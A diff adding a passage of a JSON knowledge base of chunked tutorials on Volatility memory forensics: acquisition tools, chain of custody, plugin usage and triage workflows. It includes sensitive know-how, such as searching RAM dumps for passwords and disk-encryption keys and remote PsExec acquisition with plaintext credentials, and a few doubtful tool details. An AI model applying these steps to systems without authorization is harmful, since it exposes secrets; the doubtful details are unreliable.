@@ -1,0 +1,1663 @@
+[
+  {
+    "id": "01_volatility_basics.md_0",
+    "content": "Volatility is an open-source memory forensics framework used for incident response and malware analysis. It extracts digital artifacts from volatile memory (RAM) dumps, revealing information that may not be available from traditional disk-based forensics.\n\n**Why Memory Forensics Matters:**\n- **Volatile Evidence**: RAM contains running processes, network connections, encryption keys, and malware that may not exist on disk\n- **Rootkit Detection**: Memory analysis can detect kernel-level malware that hides from disk-based tools\n- **Incident Response**: Captures the live state of a compromised system\n- **Malware Analysis**: Reveals malware behavior, code injection, and process hollowing",
+    "metadata": {
+      "filename": "01_volatility_basics.md",
+      "document_title": "Volatility Framework Basics",
+      "section": "What is Volatility?",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "01_volatility_basics.md_1",
+    "content": "### Volatility 2 (Legacy)\n- Python 2.7 (deprecated)\n- Profile-based (requires exact OS version match)\n- Command format: `vol.py -f memory.dump --profile=Win7SP1x64 pslist`\n- Large collection of community plugins\n\n### Volatility 3 (Current)\n- Python 3.6+\n- **Symbol tables** (auto-detection, no profile needed)\n- Unified plugin architecture\n- Command format: `vol.py -f memory.dump windows.pslist`\n- Better performance, cleaner codebase\n\n**Key Difference**: Volatility 3 uses **symbol tables** instead of profiles, making analysis faster and more reliable.",
+    "metadata": {
+      "filename": "01_volatility_basics.md",
+      "document_title": "Volatility Framework Basics",
+      "section": "Volatility 2 vs Volatility 3",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "01_volatility_basics.md_2",
+    "content": "### Method 1: pip (Recommended)\n```bash\npip3 install volatility3\n```\n\n### Method 2: GitHub (Latest Development)\n```bash\ngit clone https://github.com/volatilityfoundation/volatility3.git\ncd volatility3\npython3 setup.py install\n```\n\n### Method 3: Standalone Binary\nDownload pre-built binaries from: https://github.com/volatilityfoundation/volatility3/releases\n\n### Verify Installation\n```bash\nvol -h\nvol --version\n```",
+    "metadata": {
+      "filename": "01_volatility_basics.md",
+      "document_title": "Volatility Framework Basics",
+      "section": "Installation",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "01_volatility_basics.md_3",
+    "content": "### Volatility 3 Syntax\n```bash\nvol -f <memory_dump> <plugin_name> [options]\n```\n\n**Example:**\n```bash\nvol -f memory.raw windows.pslist\n```\n\n### Common Options\n- `-f FILE`: Memory dump file\n- `-o OFFSET`: Physical memory offset\n- `-v`: Verbose output\n- `--pid PID`: Filter by Process ID\n- `-r json`: Output as JSON\n- `-r pretty_json`: Human-readable JSON",
+    "metadata": {
+      "filename": "01_volatility_basics.md",
+      "document_title": "Volatility Framework Basics",
+      "section": "Basic Command Structure",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "01_volatility_basics.md_4",
+    "content": "### 1. Memory Dump\nA **memory dump** (also called **RAM capture** or **memory image**) is a snapshot of physical RAM at a specific point in time.\n\n**File Extensions:**\n- `.raw` - Raw memory dump\n- `.dmp` - Windows crash dump\n- `.mem` - VMware memory file\n- `.vmem` - VMware snapshot\n- `.bin` - Generic binary\n\n**Typical Size:**\n- 4GB RAM system → 4GB dump file\n- 16GB RAM system → 16GB dump file\n- Cloud VM → Can be 64GB+\n\n### 2. Virtual vs Physical Addresses\n- **Virtual Address**: Memory address seen by processes (isolated per-process)\n- **Physical Address**: Actual RAM location (system-wide)\n- Volatility translates between these using **page tables**",
+    "metadata": {
+      "filename": "01_volatility_basics.md",
+      "document_title": "Volatility Framework Basics",
+      "section": "Core Concepts",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "01_volatility_basics.md_5",
+    "content": "### 3. EPROCESS Structure\nWindows kernel data structure representing a process. Contains:\n- Process ID (PID)\n- Parent Process ID (PPID)\n- Image name (executable filename)\n- Creation time\n- Exit time\n- VAD (Virtual Address Descriptor) tree\n- Token (security context)\n- Handle table\n\n**Why it matters**: Volatility parses EPROCESS to extract process information.\n\n### 4. VAD (Virtual Address Descriptor)\nTree structure tracking all memory regions for a process:\n- Executable code (.exe, .dll)\n- Heap allocations\n- Stack memory\n- Memory-mapped files\n\n**Use case**: Detecting code injection (e.g., malware injecting into legitimate processes)\n\n### 5. Kernel vs User Mode\n- **Kernel Mode (Ring 0)**: OS core, drivers, privileged operations\n- **User Mode (Ring 3)**: Applications, limited privileges",
+    "metadata": {
+      "filename": "01_volatility_basics.md",
+      "document_title": "Volatility Framework Basics",
+      "section": "Core Concepts",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "01_volatility_basics.md_6",
+    "content": "**Forensics impact**: Kernel rootkits operate in Ring 0, harder to detect but leave memory artifacts.",
+    "metadata": {
+      "filename": "01_volatility_basics.md",
+      "document_title": "Volatility Framework Basics",
+      "section": "Core Concepts",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "01_volatility_basics.md_7",
+    "content": "### Process Analysis\n- `windows.pslist` - List all processes (EPROCESS linked list)\n- `windows.pstree` - Process tree (parent-child relationships)\n- `windows.psscan` - Scan for hidden/terminated processes\n- `windows.cmdline` - Command-line arguments for each process\n\n### Network Analysis\n- `windows.netscan` - Network connections (TCP/UDP/listeners)\n- `windows.netstat` - Active network connections (Volatility 2 syntax)\n\n### Malware Detection\n- `windows.malfind` - Detect code injection (VirtualAllocEx, WriteProcessMemory)\n- `windows.ldrmodules` - Find hidden DLLs (unlinked from PEB)\n- `windows.callbacks` - Kernel callbacks (rootkit detection)\n\n### Registry\n- `windows.registry.hivelist` - List registry hives in memory\n- `windows.registry.printkey` - Read registry keys/values",
+    "metadata": {
+      "filename": "01_volatility_basics.md",
+      "document_title": "Volatility Framework Basics",
+      "section": "Essential Plugins (Quick Reference)",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "01_volatility_basics.md_8",
+    "content": "### File Analysis\n- `windows.filescan` - Scan for file objects in memory\n- `windows.handles` - List open file/registry/mutex handles\n\n### System Information\n- `windows.info` - OS version, architecture, timestamp\n- `windows.modules` - Loaded kernel drivers\n- `windows.driverscan` - Scan for driver objects",
+    "metadata": {
+      "filename": "01_volatility_basics.md",
+      "document_title": "Volatility Framework Basics",
+      "section": "Essential Plugins (Quick Reference)",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "01_volatility_basics.md_9",
+    "content": "### 1. Validate the Dump\n```bash\nvol -f memory.dmp windows.info\n```\n**Output**: OS version, architecture, kernel address space\n\n### 2. List Running Processes\n```bash\nvol -f memory.dmp windows.pslist\n```\n**Look for**:\n- Suspicious process names (svchost.exe with unusual PID)\n- Processes without parent (PPID = 0)\n- Executables in wrong paths (calc.exe in C:\\Temp)\n\n### 3. Check Network Connections\n```bash\nvol -f memory.dmp windows.netscan\n```\n**Look for**:\n- Unknown external IPs\n- High-numbered ports (e.g., 4444, 8080)\n- Processes listening on all interfaces (0.0.0.0)\n\n### 4. Detect Malware\n```bash\nvol -f memory.dmp windows.malfind\n```\n**Look for**:\n- Executable memory regions (MEM_COMMIT + PAGE_EXECUTE_READWRITE)\n- Processes with injected code\n- Shellcode patterns (assembly instructions)",
+    "metadata": {
+      "filename": "01_volatility_basics.md",
+      "document_title": "Volatility Framework Basics",
+      "section": "Basic Workflow Example",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "01_volatility_basics.md_10",
+    "content": "### 5. Extract Suspicious Files\n```bash\nvol -f memory.dmp windows.filescan | grep malware.exe\nvol -f memory.dmp windows.dumpfiles --pid <PID> --outdir extracted/\n```",
+    "metadata": {
+      "filename": "01_volatility_basics.md",
+      "document_title": "Volatility Framework Basics",
+      "section": "Basic Workflow Example",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "01_volatility_basics.md_11",
+    "content": "### ❌ Wrong: Using Volatility 2 commands with Volatility 3\n```bash\nvol.py -f memory.dmp --profile=Win10x64 pslist  # Volatility 2 syntax\n```\n✅ **Correct:**\n```bash\nvol -f memory.dmp windows.pslist  # Volatility 3 syntax\n```\n\n### ❌ Wrong: Not specifying plugin namespace\n```bash\nvol -f memory.dmp pslist  # Ambiguous\n```\n✅ **Correct:**\n```bash\nvol -f memory.dmp windows.pslist  # Clear namespace\n```\n\n### ❌ Wrong: Expecting instant results on large dumps\n```bash\nvol -f 64GB_dump.raw windows.psscan  # May take 30+ minutes\n```\n✅ **Better:**\n```bash\n# Use targeted plugins first\nvol -f 64GB_dump.raw windows.pslist  # Faster (uses linked list)\n```",
+    "metadata": {
+      "filename": "01_volatility_basics.md",
+      "document_title": "Volatility Framework Basics",
+      "section": "Common Beginner Mistakes",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "01_volatility_basics.md_12",
+    "content": "### ❌ Wrong: Ignoring timestamps\n```bash\n# Finding svchost.exe at PID 1234 - is it suspicious?\n```\n✅ **Correct:**\n```bash\n# Check creation time - was it created AFTER system boot?\n# Check parent process - is it services.exe?\n# Check path - is it C:\\Windows\\System32?\n```",
+    "metadata": {
+      "filename": "01_volatility_basics.md",
+      "document_title": "Volatility Framework Basics",
+      "section": "Common Beginner Mistakes",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "01_volatility_basics.md_13",
+    "content": "1. **Volatility extracts RAM artifacts** - processes, network, malware, registry\n2. **Volatility 3 is current** - uses symbol tables, simpler syntax\n3. **Basic command**: `vol -f dump.raw windows.pluginname`\n4. **Start with pslist/netscan/malfind** for quick triage\n5. **Memory forensics reveals volatile evidence** unavailable on disk",
+    "metadata": {
+      "filename": "01_volatility_basics.md",
+      "document_title": "Volatility Framework Basics",
+      "section": "Key Takeaways (Beginner Level)",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "01_volatility_basics.md_14",
+    "content": "- **Module 02**: Memory acquisition techniques and tools\n- **Module 03**: Deep dive into process analysis\n- **Module 04**: Network forensics and malware C2 detection\n- **Module 05**: Advanced malware detection techniques\n\n---\n\n**Reference**: Volatility 3 Documentation - https://volatility3.readthedocs.io/",
+    "metadata": {
+      "filename": "01_volatility_basics.md",
+      "document_title": "Volatility Framework Basics",
+      "section": "What's Next?",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_15",
+    "content": "**Volatile data exists only in RAM:**\n- Running processes and threads\n- Network connections and open sockets\n- Encryption keys and passwords in plaintext\n- Recently executed commands\n- Malware running in memory (fileless malware)\n- Kernel rootkits and bootkits\n\n**Once the system is powered off, this evidence is GONE.**",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Why Memory Acquisition Matters",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_16",
+    "content": "### Chain of Custody\n1. **Document everything**:\n   - Time of acquisition (UTC timestamp)\n   - Who performed the acquisition\n   - System state (running, hibernating, powered off)\n   - Tool used and version\n   - Hash of memory dump (SHA-256)\n\n2. **Write-protect evidence**:\n   - Use write-blockers for disk forensics\n   - For memory: save dump to external media, not local disk\n   - Immediately calculate cryptographic hash\n\n3. **Maintain forensic soundness**:\n   - Minimize changes to target system\n   - Use trusted forensic tools\n   - Document any changes made (e.g., driver installation)",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Legal and Ethical Considerations",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_17",
+    "content": "### Authorization Requirements\n- **Corporate**: Get written authorization from IT management\n- **Law Enforcement**: Obtain proper warrant or consent\n- **Incident Response**: Ensure contractual agreement covers memory acquisition\n- **Personal Systems**: Owner consent required\n\n**NEVER acquire memory without proper authorization - legal consequences are severe.**",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Legal and Ethical Considerations",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_18",
+    "content": "### 1. FTK Imager (Free, GUI-based)\n**Platform**: Windows only\n**Use Case**: Quick acquisition, beginner-friendly\n\n**Pros:**\n- Free download from AccessData\n- GUI interface (click-to-capture)\n- Creates .mem files with metadata\n- Trusted by law enforcement\n\n**Cons:**\n- Windows only\n- Requires GUI access (not remote-friendly)\n- Limited automation\n\n**Command Line:**\n```cmd\nftkimager.exe --memory-dump \"C:\\Evidence\\memory.raw\" --verify\n```\n\n**GUI Steps:**\n1. Run FTK Imager as Administrator\n2. File → Capture Memory\n3. Specify destination path\n4. Check \"Include pagefile\"\n5. Click \"Capture Memory\"\n\n**Output**: `memory.raw` + `memory.raw.txt` (metadata file with timestamps/hash)",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Memory Acquisition Tools",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_19",
+    "content": "### 2. WinPmem (Open-source, Command-line)\n**Platform**: Windows\n**Use Case**: Remote acquisition, scripting, incident response\n\n**Pros:**\n- Open-source (Velocidex project)\n- Kernel driver signed by Microsoft\n- Fast acquisition (1GB/second on modern systems)\n- Command-line scriptable\n\n**Cons:**\n- Requires Administrator privileges\n- Must load kernel driver (may trigger EDR alerts)\n\n**Installation:**\n```powershell\n# Download from https://github.com/Velocidex/WinPmem/releases\n# Extract winpmem_mini_x64_rc2.exe\n```\n\n**Acquisition Command:**\n```powershell\n# Acquire memory to file\nwinpmem_mini_x64_rc2.exe memory.raw\n\n# Verify acquisition\nGet-FileHash memory.raw -Algorithm SHA256\n```\n\n**Output**: `memory.raw` (raw physical memory dump)",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Memory Acquisition Tools",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_20",
+    "content": "### 3. LiME (Linux Memory Extractor)\n**Platform**: Linux only\n**Use Case**: Linux server forensics, cloud VM analysis\n\n**Pros:**\n- Kernel module for raw memory acquisition\n- Works on any Linux kernel version\n- Minimal footprint\n\n**Cons:**\n- Requires kernel headers to compile\n- Must be compiled for target kernel version\n\n**Compilation:**\n```bash\n# Install kernel headers\nsudo apt-get install linux-headers-$(uname -r)\n\n# Clone LiME\ngit clone https://github.com/504ensicsLabs/LiME.git\ncd LiME/src\n\n# Compile for current kernel\nmake\n\n# Load module and acquire memory\nsudo insmod lime-$(uname -r).ko \"path=/tmp/memory.lime format=raw\"\n```\n\n**Output**: `/tmp/memory.lime` (raw Linux memory dump)",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Memory Acquisition Tools",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_21",
+    "content": "### 4. Magnet RAM Capture (Free, Windows)\n**Platform**: Windows only\n**Use Case**: Quick triage, no installation required\n\n**Pros:**\n- Portable executable (no installation)\n- Free for law enforcement and corporate IR\n- Automatic hashing\n\n**Cons:**\n- Windows only\n- GUI only (no command-line)\n\n**Usage:**\n1. Run MagnetRAMCapture.exe as Administrator\n2. Select destination folder\n3. Click \"Capture Memory\"\n\n**Output**: `<ComputerName>-<Timestamp>.raw` + `.txt` metadata\n\n### 5. DumpIt (Comae Technologies)\n**Platform**: Windows, Linux, macOS\n**Use Case**: Cross-platform, remote acquisition\n\n**Pros:**\n- Single executable (no installation)\n- Cross-platform support\n- Fast acquisition\n\n**Cons:**\n- Proprietary (not open-source)\n- Commercial licensing for corporate use",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Memory Acquisition Tools",
+      "chunk_index": 3,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_22",
+    "content": "**Usage:**\n```bash\n# Windows\nDumpIt.exe /O memory.dmp\n\n# Linux\nsudo ./DumpIt /O memory.lime\n\n# macOS\nsudo ./DumpIt /O memory.mem\n```\n\n### 6. Belkasoft Live RAM Capturer (Free)\n**Platform**: Windows\n**Use Case**: Quick acquisition with minimal footprint\n\n**Pros:**\n- Portable, no installation\n- Minimal memory footprint\n- Automatic hashing\n\n**Cons:**\n- Windows only\n- Closed-source\n\n**Usage:**\n```cmd\nRamCapture64.exe memory.mem\n```",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Memory Acquisition Tools",
+      "chunk_index": 4,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_23",
+    "content": "### Method 1: Live System Acquisition (Recommended)\n**Scenario**: System is running, attacker may still be active\n\n**Advantages:**\n- Captures volatile data (network connections, decrypted data)\n- Can acquire multiple snapshots over time\n- Processes are in known-good state\n\n**Disadvantages:**\n- Acquisition tool modifies memory (small footprint)\n- Attacker may detect acquisition\n- System must remain powered on\n\n**Best Practices:**\n```bash\n# 1. Document system state\ndate -u  # Record timestamp (UTC)\nuname -a  # Linux system info\nsysteminfo  # Windows system info\n\n# 2. Acquire memory FIRST (most volatile)\nwinpmem_mini_x64_rc2.exe memory.raw\n\n# 3. Calculate hash immediately\nsha256sum memory.raw > memory.raw.sha256\n\n# 4. Acquire disk image SECOND (less volatile)\n```",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Acquisition Methods",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_24",
+    "content": "### Method 2: Hibernation File (hiberfil.sys)\n**Scenario**: Windows system was hibernated\n\n**Advantages:**\n- No acquisition tool needed\n- Perfect snapshot of memory at hibernation time\n- No risk of detection\n\n**Disadvantages:**\n- Only available if system was hibernated\n- May be compressed (requires conversion)\n- Timestamp is hibernation time, not current time\n\n**Location:**\n```\nC:\\hiberfil.sys  (Windows)\n```\n\n**Conversion to Raw:**\n```bash\n# Using Volatility imageinfo\nvol -f hiberfil.sys windows.info\n\n# Hibernation files are usually compatible with Volatility\n# No conversion needed for Volatility 3\n```",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Acquisition Methods",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_25",
+    "content": "**Use Case Example:**\n```bash\n# Suspect hibernated laptop before border crossing\n# Acquire hiberfil.sys during forensic imaging\n# Analyze with Volatility to find encryption keys, browser history\n```\n\n### Method 3: Crash Dump (Memory.dmp)\n**Scenario**: Windows crashed (BSOD) and wrote crash dump\n\n**Advantages:**\n- Already on disk (no acquisition needed)\n- Perfect memory snapshot at crash time\n- Includes kernel debugging information\n\n**Disadvantages:**\n- Only kernel memory (not full RAM on some systems)\n- Compressed/filtered (some data removed)\n- Only available if system crashed\n\n**Location:**\n```\nC:\\Windows\\MEMORY.DMP  (Complete memory dump)\nC:\\Windows\\Minidump\\*.dmp  (Kernel dump only - limited use)\n```",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Acquisition Methods",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_26",
+    "content": "**Configuration:**\n```powershell\n# Enable complete memory dumps (before crash)\n# System Properties → Advanced → Startup and Recovery → Settings\n# Write debugging information: Complete memory dump\n```\n\n**Volatility Analysis:**\n```bash\nvol -f MEMORY.DMP windows.pslist\n```\n\n### Method 4: Virtual Machine Snapshots\n**Scenario**: Target is a VM (VMware, VirtualBox, Hyper-V)\n\n**Advantages:**\n- Can pause VM without shutting down\n- Memory state saved automatically\n- Can acquire from hypervisor (no guest tool needed)\n\n**Disadvantages:**\n- Requires hypervisor access\n- May alert monitoring systems\n\n**VMware:**\n```bash\n# Suspend VM (creates .vmem file)\n# Location: <VM_folder>/<VM_name>.vmem\n\n# Analyze with Volatility\nvol -f VM_snapshot.vmem windows.pslist\n```",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Acquisition Methods",
+      "chunk_index": 3,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_27",
+    "content": "**VirtualBox:**\n```bash\n# Save state (creates .sav file)\n# Must convert to raw\n\n# Use vboxmanage\nVBoxManage debugvm \"<VM_name>\" dumpvmcore --filename=memory.raw\n```\n\n**Hyper-V:**\n```powershell\n# Export VM (includes .bin memory file)\n# Convert to raw using Volatility convert plugin\n```\n\n### Method 5: Cloud VM Acquisition\n**Scenario**: Target is EC2, Azure VM, GCP instance\n\n**Challenges:**\n- Cannot install kernel drivers on cloud VMs (usually)\n- Hypervisor memory acquisition requires provider support\n- Snapshots may not include RAM\n\n**Solutions:**\n\n**AWS EC2:**\n```bash\n# Use EC2 Instance Metadata Service\n# Acquire from within VM using WinPmem/LiME\n\n# Or request AWS forensic support (Enterprise Support required)\n```",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Acquisition Methods",
+      "chunk_index": 4,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_28",
+    "content": "**Azure:**\n```powershell\n# Use Azure Serial Console to acquire memory\n# Or run acquisition tool inside VM\n\n# Azure Memory Analysis Tool (preview)\n# Requires Azure Security Center integration\n```\n\n**GCP:**\n```bash\n# Use gcloud compute instances to create snapshot\n# Memory dump requires custom acquisition script\n```",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Acquisition Methods",
+      "chunk_index": 5,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_29",
+    "content": "**From MOST volatile to LEAST volatile:**\n\n1. **CPU Registers and Cache** (lost on power cycle)\n2. **RAM Contents** (lost on power cycle)\n3. **Network connections** (lost when network card resets)\n4. **Running processes** (lost on shutdown)\n5. **Swap/Pagefile** (persists on disk)\n6. **Disk data** (persists until overwritten)\n7. **Backup media** (most persistent)\n\n**Forensic Acquisition Priority:**\n```\n1. Capture RAM (volatile)\n2. Capture network traffic (volatile)\n3. Capture running process list (volatile)\n4. Acquire disk image (less volatile)\n5. Acquire logs from remote systems (persistent)\n```",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Acquisition Order of Volatility",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_30",
+    "content": "### Scenario 1: Ransomware Incident (Live System)\n**Goal**: Capture encryption keys from memory before shutdown\n\n**Steps:**\n```powershell\n# 1. DO NOT SHUTDOWN (keys will be lost)\n# 2. Acquire memory immediately\nwinpmem_mini_x64_rc2.exe C:\\Evidence\\ransomware_memory.raw\n\n# 3. Analyze for encryption keys\nvol -f ransomware_memory.raw windows.filescan | grep -i \"aes\\|crypt\\|key\"\n\n# 4. Extract keys using bulk_extractor\nbulk_extractor -o extracted/ ransomware_memory.raw\n```\n\n### Scenario 2: APT Investigation (Stealthy Acquisition)\n**Goal**: Acquire memory without alerting attacker\n\n**Steps:**\n```bash\n# Use stealthy tool (avoid EDR detection)\n# Acquire to network share (avoid disk writes)\n\nnet use Z: \\\\forensics-server\\evidence /user:admin password\nwinpmem_mini_x64_rc2.exe Z:\\victim-2024-01-18.raw",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Practical Scenarios",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_31",
+    "content": "# If network unavailable, use external USB\nwinpmem_mini_x64_rc2.exe E:\\memory.raw\n```\n\n### Scenario 3: Remote Acquisition Over Network\n**Goal**: Acquire memory from remote system without physical access\n\n**Steps:**\n```powershell\n# Using PsExec (Sysinternals)\nPsExec.exe \\\\remote-system -u admin -p password -c winpmem.exe C:\\Windows\\Temp\\memory.raw\n\n# Copy back over network\nxcopy \\\\remote-system\\C$\\Windows\\Temp\\memory.raw C:\\Evidence\\ /C\n\n# Calculate hash\nGet-FileHash C:\\Evidence\\memory.raw -Algorithm SHA256\n```\n\n### Scenario 4: Encrypted Disk Investigation\n**Goal**: Find disk encryption keys in memory\n\n**Steps:**\n```bash\n# 1. Acquire memory from running system (keys in RAM)\nsudo insmod lime.ko \"path=/tmp/memory.lime format=raw\"",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Practical Scenarios",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_32",
+    "content": "# 2. Search for BitLocker/LUKS keys\nvol -f memory.lime linux.bash  # Find recent commands\nstrings memory.lime | grep -i \"password\\|passphrase\"\n\n# 3. Extract encryption keys using specialized tools\n# Example: FindAES (searches for AES key schedules)\n```",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Practical Scenarios",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_33",
+    "content": "### ❌ Pitfall 1: Acquiring to Same Disk\n```bash\n# WRONG: Overwrites evidence on target disk\nwinpmem.exe C:\\memory.raw  # Writing to C: may overwrite deleted files\n```\n\n**✅ Correct:**\n```bash\n# Write to external media or network share\nwinpmem.exe E:\\memory.raw  # External USB drive\nwinpmem.exe \\\\server\\evidence\\memory.raw  # Network share\n```\n\n### ❌ Pitfall 2: Not Hashing Immediately\n```bash\n# WRONG: Acquiring without hash\nwinpmem.exe memory.raw\n# (Later, how do you prove it wasn't modified?)\n```\n\n**✅ Correct:**\n```bash\n# Calculate hash immediately after acquisition\nwinpmem.exe memory.raw\nsha256sum memory.raw > memory.raw.sha256\n# Document hash in case notes\n```",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Common Pitfalls",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_34",
+    "content": "### ❌ Pitfall 3: Using Untrusted Tools\n```bash\n# WRONG: Using random memory acquisition tool from internet\n# (Could be trojanized, compromising investigation)\n```\n\n**✅ Correct:**\n```bash\n# Use well-known, trusted tools\n# - FTK Imager (AccessData)\n# - WinPmem (Google/Velocidex)\n# - LiME (504ENSICS Labs)\n# - Magnet RAM Capture (Magnet Forensics)\n```\n\n### ❌ Pitfall 4: Waiting Too Long\n```bash\n# WRONG: Imaging disk first, RAM second\n# (Suspect reboots during disk imaging → RAM evidence lost)\n```\n\n**✅ Correct:**\n```bash\n# Acquire most volatile evidence first\n1. Memory dump (5 minutes)\n2. Network traffic capture (ongoing)\n3. Disk image (hours)\n```",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Common Pitfalls",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_35",
+    "content": "1. **Acquire RAM first** - most volatile evidence\n2. **Use trusted tools** - FTK Imager, WinPmem, LiME\n3. **Document everything** - timestamps, hashes, chain of custody\n4. **Acquire to external media** - never write to target system disk\n5. **Hash immediately** - proves integrity of evidence\n6. **Get authorization** - legal requirement, not optional",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "Key Takeaways",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "02_memory_acquisition.md_36",
+    "content": "- **Module 03**: Process analysis techniques\n- **Module 04**: Network forensics and malware C2 detection\n- **Module 05**: Advanced malware detection using Volatility\n\n---\n\n**Legal Disclaimer**: Memory acquisition may be illegal without proper authorization. Always obtain written consent or legal authority before acquiring memory from any system.",
+    "metadata": {
+      "filename": "02_memory_acquisition.md",
+      "document_title": "Memory Acquisition for Forensic Analysis",
+      "section": "What's Next?",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_37",
+    "content": "### What is a Process?\nA **process** is an instance of a running program. Each process has:\n- **Process ID (PID)**: Unique identifier\n- **Parent Process ID (PPID)**: PID of process that created it\n- **Image Name**: Executable filename (e.g., svchost.exe)\n- **Memory Space**: Virtual address space (user + kernel)\n- **Threads**: Execution units within the process\n- **Handles**: Open files, registry keys, mutexes, sockets",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Understanding Windows Processes",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
